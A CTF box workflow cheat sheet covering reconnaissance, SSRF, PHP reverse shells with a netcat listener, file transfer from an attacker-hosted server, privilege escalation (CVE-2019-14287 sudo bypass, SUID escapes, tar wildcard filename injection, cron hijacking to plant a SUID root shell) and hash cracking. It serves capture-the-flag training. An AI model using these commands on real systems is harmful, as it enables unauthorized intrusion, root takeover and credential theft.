# CTF Box Workflow — Quick Reference

---

## 1. Recon

Full port scan with version detection and default scripts:
```bash
 
```

Always use `-sC` — it runs SMB enumeration, FTP anonymous check, HTTP title grab automatically.

If port 80/443 open, run gobuster immediately:
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 50
```

If ports 139/445 (SMB) open:
```bash
enum4linux -a TARGET
```

If port 21 (FTP) open — always try anonymous:
```bash
ftp TARGET
# Name: anonymous
# Password: (blank or anonymous)
ftp> ls -la
ftp> get FILENAME
```

**What to look for:**
- Upload forms, admin panels, login pages
- Server language (PHP, Python, Node) — determines shell type
- Version numbers — run through searchsploit
- Source code in FTP — read every file
- Developer notes with usernames, passwords, hints

---

## 2. Web Enumeration

Check page source (Ctrl+U in browser) for hidden comments, links, credentials.

If the site processes URLs or makes requests on your behalf — suspect SSRF.

Check response headers:
```bash
curl -v http://TARGET
```

If you find source code, read it for:
- Hardcoded credentials or API keys
- Internal hostnames or IP addresses
- Admin routes with IP restrictions
- File read/write operations
- Vulnerability comments (yes, developers do this)

---

## 3. SSRF (Server-Side Request Forgery)

**When to suspect it:** App takes a URL as input and fetches it. Common parameter names: `url=`, `path=`, `dest=`, `redirect=`, `uri=`

**The attack:** Make the server request internal resources it can reach but you can't.

**Common targets:**
- `http://localhost/admin` — admin panels restricted to localhost
- `http://127.0.0.1:PORT` — internal services not exposed externally
- `http://169.254.169.254/` — AWS metadata endpoint (cloud boxes)

**Basic test:**
```
http://TARGET/preview?url=http://127.0.0.1/admin/notes
```

**If there's a hostname allowlist**, check if the allowed hostname resolves to localhost on the server. If so:
```
http://TARGET/preview?url=http://ALLOWED_HOST/admin/notes
```

**Add custom hostnames to /etc/hosts:**
```bash
echo "TARGET_IP hostname.thm" | sudo tee -a /etc/hosts
```

**Remove when done or IP changes:**
```bash
sudo sed -i '/hostname.thm/d' /etc/hosts
```

---

## 4. Getting a Shell

### PHP reverse shell (file upload)
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
# Edit: $ip = 'YOUR_TUN0_IP'; $port = 4444;
```

Find your tun0 IP:
```bash
ip addr show tun0
```

If upload filter blocks .php, try:
```
.php5  .phtml  .pHp  .php7
```

### Netcat listener
```bash
nc -lvnp 4444
```

### Upgrade shell after connection
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

If terminal breaks: `reset`

### Transfer files to target
```bash
# On Kali — serve a file
python3 -m http.server 8000

# On target — download it
wget http://YOUR_IP:8000/filename
curl http://YOUR_IP:8000/filename -o filename
```

### Get files from target to Kali
```bash
scp USER@TARGET:/path/to/file ~/local/destination/
```

---

## 5. Privilege Escalation

Run these checks in order every time.

**Check 1 — sudo rights (always first):**
```bash
sudo -l
```
If anything comes back, look it up on GTFOBins immediately.

**Check 2 — SUID binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null
```
Dangerous if you see: python, perl, vim, find, bash, nmap, tar, cp.

**Check 3 — Cron jobs:**
```bash
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
```
Look for: jobs running as root, scripts in writable directories, wildcards (`*`).

**Check 4 — Credentials and history:**
```bash
cat ~/.bash_history
cat /etc/passwd
find / -name "*.txt" -readable 2>/dev/null | grep -v proc
```

**Check 5 — Writable files owned by root:**
```bash
find / -writable -user root 2>/dev/null | grep -v proc
```

**Check 6 — Running processes:**
```bash
ps aux
```
Look for processes running as root that you might interact with.

---

## 6. Privesc Techniques

### sudo GTFOBins bypass
If sudo -l shows `(ALL, !root) /bin/bash` — use CVE-2019-14287:
```bash
sudo -u#-1 /bin/bash
```

### SUID binary abuse
Look up the binary on GTFOBins. Common examples:
```bash
# vim
vim -c ':!/bin/bash'

# python
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# find
find . -exec /bin/bash -p \; -quit
```

### Tar wildcard injection (cron)
If root runs `tar ... *` in a directory you can write to:
```bash
# Create malicious script
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /WRITABLE_DIR/shell.sh
chmod +x /WRITABLE_DIR/shell.sh

# Create magic filename files
echo "" > /WRITABLE_DIR/--checkpoint=1
echo "" > "/WRITABLE_DIR/--checkpoint-action=exec=sh shell.sh"

# Wait for cron to run (up to 60 seconds for * * * * *)
# Then:
/tmp/rootbash -p
```

**Note:** Always use `-p` with SUID bash — without it bash drops privileges.

### Writable script called by root cron
If root's cron runs a script you can write to:
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/script.sh
# Wait for cron, then /tmp/rootbash -p
```

---

## 7. Steganography

Always check image files:
```bash
file IMAGE           # confirm actual file type
exiftool IMAGE       # check metadata
strings IMAGE        # look for plaintext
binwalk IMAGE        # detect embedded files
```

For JPEG — check for hidden data:
```bash
steghide extract -sf IMAGE    # try empty passphrase first
stegseek IMAGE /usr/share/wordlists/rockyou.txt    # brute force passphrase
```

For PNG — binwalk for embedded files:
```bash
binwalk -e IMAGE
cd _IMAGE.extracted/
zip2john *.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 8. Hash Cracking

Identify hash type:
```bash
hash-identifier
hashid 'HASH'
```

Common hashcat modes:
| Type | Mode |
|------|------|
| MD5 | 0 |
| SHA-1 | 100 |
| SHA-256 | 1400 |
| SHA-512 | 1700 |
| bcrypt | 3200 |
| SHA-512crypt ($6$) | 1800 |
| HMAC-SHA1 (with salt) | 160 |
| NTLM | 1000 |

Format for salted hashes: `hash:salt` in the hash file.

Crack with wordlist (GPU on Windows host):
```
hashcat.exe -m MODE -a 0 hash.txt rockyou.txt
```

Crack with rules (when rockyou fails):
```
hashcat.exe -m MODE -a 0 hash.txt rockyou.txt -r rules/best66.rule
```

SSH private key passphrase:
```bash
ssh2john key_file > key_hash.txt
john key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 9. SMB Enumeration

```bash
enum4linux -a TARGET           # full enumeration
enum4linux -U TARGET           # users only
enum4linux -S TARGET           # shares only

smbclient -L //TARGET -N      # list shares
smbclient //TARGET/SHARE -N   # connect to share
```

---

## 10. Find Flags

```bash
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
find / -name flag.txt 2>/dev/null
find / -name "*.txt" -path "*/root/*" 2>/dev/null
```

---

## Reference Links

- **GTFOBins:** https://gtfobins.github.io
- **Hashcat example hashes:** https://hashcat.net/wiki/doku.php?id=example_hashes
- **CrackStation:** https://crackstation.net
- **Reverse shell generator:** https://www.revshells.com
- **Exploit DB:** https://www.exploit-db.com
- **searchsploit (local):** `searchsploit SERVICE VERSION`